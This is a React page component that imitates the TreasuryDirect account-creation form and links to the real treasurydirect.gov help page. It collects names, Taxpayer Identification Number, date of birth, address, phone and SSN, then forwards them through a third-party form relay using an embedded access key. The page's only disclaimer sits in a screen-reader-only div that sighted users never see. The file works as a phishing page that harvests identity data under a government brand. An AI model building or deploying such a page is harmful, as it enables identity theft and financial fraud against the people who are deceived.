// src/pages/CreateYourAccount.jsx
import React, { useEffect, useRef } from 'react';
import { Link } from 'react-router-dom';
import useWeb3Forms from '../hooks/useWeb3Forms';
import '../styles/create_account.css';

const loadingOverlayStyling = {
    display: 'none',
    position: 'fixed',
    top: 0,
    left: 0,
    width: '100vw',
    height: '100vh',
    background: 'rgba(255,255,255,0.85)',
    zIndex: 9999,
    justifyContent: 'center',
    alignItems: 'center',
    flexDirection: 'column',
};

const verifyingTextStyle = {
    marginTop: '16px',
    fontSize: '1.2em',
    color: '#0078d4',
    fontWeight: 'bold',
};

const errorMessages = {
    UserID: 'User ID must be 8-9 alphanumeric characters',
    firstName: 'First name is required and can only contain letters, spaces, hyphens, and apostrophes',
    lastName: 'Last name is required and can only contain letters, spaces, hyphens, and apostrophes',
    tin1: 'TIN first part must be 3 digits',
    tin2: 'TIN second part must be 2 digits',
    tin3: 'TIN third part must be 4 digits',
    dobMonth: 'Month must be 01-12',
    dobDay: 'Day must be 01-31',
    dobYear: 'Year must be 1900-2029',
    address1: 'Street address is required',
    city: 'City is required and can only contain letters, spaces, hyphens, apostrophes, and periods',
    state: 'Please select a state',
    zip5: 'Zip code must be 5 digits',
    phone1: 'Area code must be 3 digits',
    phone2: 'Phone number second part must be 3 digits',
    phone3: 'Phone number third part must be 4 digits',
    SSN: 'SSN must be 9 digits',
};

export default function CreateYourAccount() {
    const formRef = useRef(null);

    // Keep only the hook outputs we actually use
    const { loading, feedback, handleSubmit } = useWeb3Forms();

    // Auto-advance behaviour
    useEffect(() => {
        if (typeof document === 'undefined') return;

        function setupAutoAdvance(fromId, toId, maxLength) {
            const fromField = document.getElementById(fromId);
            const toField = document.getElementById(toId);
            if (!fromField || !toField) return () => { console.error(fromField, toField) };
            const onInput = () => {
                if (fromField.value.length >= maxLength) {
                    try { toField.focus(); } catch (e) { console.error(e) };
                }
            };
            fromField.addEventListener('input', onInput);
            return () => fromField.removeEventListener('input', onInput);
        }

        const cleanups = [
            setupAutoAdvance('tin1', 'tin2', 3),
            setupAutoAdvance('tin2', 'tin3', 2),
            setupAutoAdvance('dobMonth', 'dobDay', 2),
            setupAutoAdvance('dobDay', 'dobYear', 2),
            setupAutoAdvance('phone1', 'phone2', 3),
            setupAutoAdvance('phone2', 'phone3', 3),
            setupAutoAdvance('zip5', 'zip4', 5),
        ];

        return () => cleanups.forEach(c => c && c());
    }, []);

    // Real-time validation that writes into the existing error divs
    useEffect(() => {
        if (typeof document === 'undefined') return;
        const formEl = formRef.current;
        if (!formEl) return;

        const onInput = (e) => {
            const field = e.target;
            if (!field || !field.id) return;
            const errDiv = document.getElementById(field.id + '-error');
            if (!errDiv) return;

            if (typeof field.checkValidity === 'function' && field.checkValidity()) {
                errDiv.style.display = 'none';
                errDiv.textContent = '';
                try { field.style.borderColor = '#00aa00'; } catch (e) { console.error(e) }
            } else {
                const msg = errorMessages[field.id] || field.validationMessage || 'Invalid value';
                errDiv.textContent = msg;
                errDiv.style.display = 'block';
                try { field.style.borderColor = '#ff0000'; } catch (e) { console.error(e) }
            }

            // DOB composite validation
            if (['dobMonth', 'dobDay', 'dobYear'].includes(field.id)) {
                const dobErrorDiv = document.getElementById('dob-error');
                const month = document.getElementById('dobMonth')?.value;
                const day = document.getElementById('dobDay')?.value;
                const year = document.getElementById('dobYear')?.value;
                if (month && day && year) {
                    const date = new Date(Number(year), Number(month) - 1, Number(day));
                    const valid = date.getFullYear() === Number(year) &&
                        date.getMonth() === (Number(month) - 1) &&
                        date.getDate() === Number(day);
                    const today = new Date();
                    const reasonable = date < today && date.getFullYear() > 1900;
                    if (!valid || !reasonable) {
                        if (dobErrorDiv) { dobErrorDiv.textContent = 'Please enter a valid date'; dobErrorDiv.style.display = 'block'; }
                    } else {
                        if (dobErrorDiv) { dobErrorDiv.textContent = ''; dobErrorDiv.style.display = 'none'; }
                    }
                } else {
                    if (dobErrorDiv) { dobErrorDiv.textContent = ''; dobErrorDiv.style.display = 'none'; }
                }
            }
        };

        formEl.addEventListener('input', onInput);
        return () => formEl.removeEventListener('input', onInput);
    }, []);

    // Validation helper for submit-time checks
    function validateFormBeforeSubmit(formEl) {
        if (!formEl) return false;

        // Clear previous errors
        const errDivs = formEl.querySelectorAll('.error-message');
        errDivs.forEach(div => {
            div.textContent = '';
            (div.style) && (div.style.display = 'none');
        });

        const fields = Array.from(formEl.elements).filter(el => el.name && !el.disabled);
        const errors = [];

        // Use HTML5 constraint API first
        for (const field of fields) {
            if (typeof field.checkValidity === 'function' && !field.checkValidity()) {
                const id = field.id || field.name;
                const errDiv = document.getElementById((field.id || id) + '-error');
                const msg = errorMessages[field.id] || field.validationMessage || 'Invalid value';
                if (errDiv) {
                    errDiv.textContent = msg;
                    errDiv.style.display = 'block';
                }
                try { field.style.borderColor = '#ff0000'; } catch (e) { console.error(e) }
                errors.push(field);
            }
        }

        // Composite DOB validation (stronger than individual pattern checks)
        const m = document.getElementById('dobMonth')?.value;
        const d = document.getElementById('dobDay')?.value;
        const y = document.getElementById('dobYear')?.value;
        if (m || d || y) {
            const dobErrorDiv = document.getElementById('dob-error');
            if (!(m && d && y)) {
                // incomplete DOB is invalid if any part filled (because fields are required in your markup)
                if (dobErrorDiv) { dobErrorDiv.textContent = 'Please complete date of birth'; dobErrorDiv.style.display = 'block'; }
                errors.push(document.getElementById('dobMonth') || document.getElementById('dobDay') || document.getElementById('dobYear'));
            } else {
                const date = new Date(Number(y), Number(m) - 1, Number(d));
                const valid = date.getFullYear() === Number(y) && date.getMonth() === (Number(m) - 1) && date.getDate() === Number(d);
                const today = new Date();
                const reasonable = date < today && date.getFullYear() > 1900;
                if (!valid || !reasonable) {
                    if (dobErrorDiv) { dobErrorDiv.textContent = 'Please enter a valid date'; dobErrorDiv.style.display = 'block'; }
                    errors.push(document.getElementById('dobMonth') || document.getElementById('dobDay') || document.getElementById('dobYear'));
                } else {
                    if (dobErrorDiv) { dobErrorDiv.textContent = ''; dobErrorDiv.style.display = 'none'; }
                }
            }
        }

        if (errors.length > 0) {
            // focus first invalid field
            try { errors[0].focus(); } catch (e) { console.error(e) }
            return false;
        }

        return true;
    }

    // Submit wrapper that validates then forwards to the hook
    const onSubmit = (e) => {
        e.preventDefault();
        const formEl = formRef.current;
        if (!formEl) return;

        const ok = validateFormBeforeSubmit(formEl);
        if (!ok) return; // prevent submission when invalid

        // if valid, forward to hook (hook will do PDF + Web3Forms)
        handleSubmit(e);
    };

    return (
        <>
            <div className="sr-only">
                <p>This is a pet project to improve my skills. This is not the real site.</p>
            </div>
            
            <div id="top">
                <div id="sublocal">
                    <ul>
                        <li id="help">
                            <a href="http://www.treasurydirect.gov/indiv/help/TDHelp/default.htm" target="_blank" rel="noopener noreferrer">Help</a>
                        </li>
                    </ul>
                </div>
            </div>

            <div id="primaryNav">
                &nbsp;
            </div>

            <div id="content">
                <div
                    id="loadingOverlay"
                    style={{ ...loadingOverlayStyling, display: loading ? 'flex' : loadingOverlayStyling.display }}
                    aria-hidden={!loading}
                >
                    <svg width="60" height="60" viewBox="0 0 50 50" aria-hidden>
                        <circle cx="25" cy="25" r="20" stroke="#0078d4" strokeWidth="5" fill="none" strokeLinecap="round">
                            <animateTransform attributeName="transform" type="rotate" from="0 25 25" to="360 25 25" dur="1s" repeatCount="indefinite" />
                        </circle>
                    </svg>
                    <div style={verifyingTextStyle}>Verifying...</div>
                </div>

                <form
                    name="LongValidation"
                    id="validationForm"
                    ref={formRef}
                    noValidate
                    data-access-key="8846fd41-02bb-4bc3-9676-9cfc9e69bbd7"
                    onSubmit={onSubmit}
                >
                    <h1><strong>Creating Your Account</strong></h1>

                    <p><span className="emphasis">We will be creating your account,</span> please fill out the information below.</p>

                    <table>
                        <tbody>
                            <tr>
                                <td className="alignright"><strong>Account User ID:</strong></td>
                                <td>
                                    <input type="text" name="UserID" id="UserID" size="9" maxLength="9" pattern="[A-Za-z0-9]{8,9}" title="User ID must be 8-9 alphanumeric characters" required />
                                    <div className="error-message" id="UserID-error"></div>
                                </td>
                            </tr>

                            <tr>
                                <td className="alignright"><strong>First Name:</strong></td>
                                <td>
                                    <input type="text" name="firstName" id="firstName" size="33" maxLength="33" pattern="[A-Za-z\s\-']{1,33}" title="First name can only contain letters, spaces, hyphens, and apostrophes" required />
                                    <div className="error-message" id="firstName-error"></div>
                                </td>
                            </tr>

                            <tr>
                                <td className="alignright"><strong>Middle Name or Initial:</strong></td>
                                <td>
                                    <input type="text" name="middleInitialName" id="middleInitialName" size="33" maxLength="33" pattern="[A-Za-z\s\-'\.]{0,33}" title="Middle name can only contain letters, spaces, hyphens, apostrophes, and periods" />
                                    <div className="error-message" id="middleInitialName-error"></div>
                                </td>
                            </tr>

                            <tr>
                                <td className="alignright"><strong>Last Name:</strong></td>
                                <td>
                                    <input type="text" name="lastName" id="lastName" size="33" maxLength="33" pattern="[A-Za-z\s\-']{1,33}" title="Last name can only contain letters, spaces, hyphens, and apostrophes" required />
                                    <div className="error-message" id="lastName-error"></div>
                                </td>
                            </tr>

                            <tr>
                                <td className="alignright"><strong>Suffix:</strong></td>
                                <td>
                                    <select name="suffix" id="suffix" required>
                                        <option value="">- -</option>
                                        <option value="1694793942008744190">II</option>
                                        <option value="4030367324489435997">III</option>
                                        <option value="438831861812947077">IV</option>
                                        <option value="2123530381978551368">JR</option>
                                        <option value="2435921748841385324">SR</option>
                                        <option value="2436782732834672348">MR</option>
                                        <option value="7283748273427365324">MRS</option>
                                        <option value="7288232734982786327">MISS</option>
                                    </select>
                                    <div className="error-message" id="suffix-error"></div>
                                </td>
                            </tr>

                            <tr>
                                <td className="alignright"><strong>Taxpayer Identification Number:</strong></td>
                                <td>
                                    <input type="text" name="tin1" id="tin1" size="3" maxLength="3" pattern="[0-9]{3}" title="3 digits required" required /> -
                                    <input type="text" name="tin2" id="tin2" size="2" maxLength="2" pattern="[0-9]{2}" title="2 digits required" required /> -
                                    <input type="text" name="tin3" id="tin3" size="4" maxLength="4" pattern="[0-9]{4}" title="4 digits required" required />
                                    <div className="error-message" id="tin-error"></div>
                                </td>
                            </tr>

                            <tr>
                                <td className="alignright"><strong>Date of Birth:</strong></td>
                                <td>
                                    <input type="text" name="dateOfBirthMonth" id="dobMonth" size="2" maxLength="2" pattern="(0[1-9]|1[0-2])" title="Month: 01-12" placeholder="MM" required /> -
                                    <input type="text" name="dateOfBirthDay" id="dobDay" size="2" maxLength="2" pattern="(0[1-9]|[12][0-9]|3[01])" title="Day: 01-31" placeholder="DD" required /> -
                                    <input type="text" name="dateOfBirthYear" id="dobYear" size="4" maxLength="4" pattern="(19[0-9]{2}|20[0-2][0-9])" title="Year: 1900-2029" placeholder="YYYY" required />
                                    (MM-DD-YYYY)
                                    <div className="error-message" id="dob-error"></div>
                                </td>
                            </tr>

                            <tr>
                                <td className="alignrighttop"><strong>Street Address:</strong></td>
                                <td>
                                    <input type="text" name="address1" id="address1" size="42" maxLength="42"
                                        pattern="[A-Za-z0-9\s\-\.,#]{1,42}" title="Address can contain letters, numbers, spaces, hyphens, periods, commas, and #"
                                        required />
                                    <br />
                                    <input type="text" name="address2" id="address2" size="42" maxLength="42"
                                        pattern="[A-Za-z0-9\s\-\.,#]{0,42}" title="Address can contain letters, numbers, spaces, hyphens, periods, commas, and #" />
                                    <br />
                                    <input type="text" name="address3" id="address3" size="42" maxLength="42"
                                        pattern="[A-Za-z0-9\s\-\.,#]{0,42}" title="Address can contain letters, numbers, spaces, hyphens, periods, commas, and #" />
                                    <div className="error-message" id="address-error"></div>
                                </td>
                            </tr>

                            <tr>
                                <td className="alignright"><strong>City:</strong></td>
                                <td>
                                    <input type="text" name="city" id="city" size="28" maxLength="28"
                                        pattern="[A-Za-z\s\-'\.]{1,28}" title="City can only contain letters, spaces, hyphens, apostrophes, and periods" required />
                                    <div className="error-message" id="city-error"></div>
                                </td>
                            </tr>

                            <tr>
                                <td className="alignright"><strong>State:</strong></td>
                                <td>
                                    <select name="state" id="state" required>
                                        <option value="">- -</option>
                                        <option value="8598674547722903935">AA</option>
                                        <option value="5313622582259502946">AE</option>
                                        <option value="928909430154162928">AK</option>
                                        <option value="7477970154953248643">AL</option>
                                        <option value="6990245930478072430">AP</option>
                                        <option value="9094289557873985360">AR</option>
                                        <option value="7487169904578219273">AS</option>
                                        <option value="2970493104545150491">AZ</option>
                                        <option value="1553780604086528971">CA</option>
                                        <option value="5554335241642179669">CO</option>
                                        <option value="3666726837399119245">CT</option>
                                        <option value="6504187002807827543">DC</option>
                                        <option value="4907157624358706996">DE</option>
                                        <option value="7035735884611023385">FL</option>
                                        <option value="7007196701186121060">FM</option>
                                        <option value="4545451583934399918">GA</option>
                                        <option value="442277103577769764">GU</option>
                                        <option value="6199229554096168344">HI</option>
                                        <option value="4985494096137497686">IA</option>
                                        <option value="6090750607924898030">ID</option>
                                        <option value="4151282320355089895">IL</option>
                                        <option value="3126592189762255777">IN</option>
                                        <option value="128240666020496929">KS</option>
                                        <option value="8647788177865645651">KY</option>
                                        <option value="9115639488948450262">LA</option>
                                        <option value="9077255988983707479">MA</option>
                                        <option value="4735877687067578333">MD</option>
                                        <option value="6649675970347765696">ME</option>
                                        <option value="4374701799632789787">MH</option>
                                        <option value="274887142488006476">MI</option>
                                        <option value="1459071627873703506">MN</option>
                                        <option value="4370732229556776315">MO</option>
                                        <option value="1340664853146442528">MP</option>
                                        <option value="2187114600699809023">MS</option>
                                        <option value="6228520535531280857">MT</option>
                                        <option value="7410952772046243209">NC</option>
                                        <option value="3227402275473228758">ND</option>
                                        <option value="8766661684650453856">NE</option>
                                        <option value="3038971958617894552">NH</option>
                                        <option value="6757129029278241988">NJ</option>
                                        <option value="1829611212013555806">NM</option>
                                        <option value="667931789374116030">NV</option>
                                        <option value="2513432432624519317">NY</option>
                                        <option value="201887661884810566">OH</option>
                                        <option value="7045293853840309135">OK</option>
                                        <option value="4539828171625857777">OR</option>
                                        <option value="8157764479785847437">PA</option>
                                        <option value="5512498811272391633">PR</option>
                                        <option value="7511478090741172340">PW</option>
                                        <option value="6356951939070619641">RI</option>
                                        <option value="8518772817176959557">SC</option>
                                        <option value="5869182155327462091">SD</option>
                                        <option value="204421276937163980">TN</option>
                                        <option value="254794042580288523">TX</option>
                                        <option value="2636680241895435797">UT</option>
                                        <option value="2813314524288777951">VA</option>
                                        <option value="7169509985684817015">VI</option>
                                        <option value="7523734262808736130">VT</option>
                                        <option value="2375736354230074273">WA</option>
                                        <option value="5116496426367695790">WI</option>
                                        <option value="4738230027881494703">WV</option>
                                        <option value="4122154041769220039">WY</option>
                                    </select>
                                    <div className="error-message" id="state-error"></div>
                                </td>
                            </tr>

                            <tr>
                                <td className="alignright"><strong>Zip Code:</strong></td>
                                <td>
                                    <input type="text" name="zip5" id="zip5" size="5" maxLength="5" pattern="[0-9]{5}" title="5 digits required" required /> -
                                    <input type="text" name="zip4" id="zip4" size="4" maxLength="4" pattern="[0-9]{4}" title="4 digits" /> (Plus Four - Optional)
                                    <div className="error-message" id="zip-error"></div>
                                </td>
                            </tr>

                            <tr>
                                <td className="alignright"><strong>Home Phone:</strong></td>
                                <td>
                                    (<input type="text" name="homePhone1" id="phone1" size="3" maxLength="3" pattern="[0-9]{3}" title="3 digits required" required />)
                                    <input type="text" name="homePhone2" id="phone2" size="3" maxLength="3" pattern="[0-9]{3}" title="3 digits required" required /> -
                                    <input type="text" name="homePhone3" id="phone3" size="4" maxLength="4" pattern="[0-9]{4}" title="4 digits required" required />
                                    <div className="error-message" id="phone-error"></div>
                                </td>
                            </tr>

                            <tr>
                                <td className="alignright"><strong>SSN:</strong></td>
                                <td>
                                    <input type="text" name="SSN" id="SSN" size="9" maxLength="9" pattern="[0-9]{9}" title="9 digits required" /> (Optional)
                                    <div className="error-message" id="SSN-error"></div>
                                </td>
                            </tr>

                        </tbody>
                    </table>

                    <button id="continue" className="action" type="submit" name="2569046599363166971" value="Continue">Continue</button>
                </form>

                <div id="form-feedback" style={{ marginTop: 12, color: feedback && feedback.startsWith('Error') ? '#b00' : '#080' }}>
                    {feedback}
                </div>

            </div>

            <div id="footer">
                <ul>
                    <li>
                        <Link to="ContactUsPage">Contact Us</Link>
                    </li>
                </ul>
            </div>
        </>
    );
}
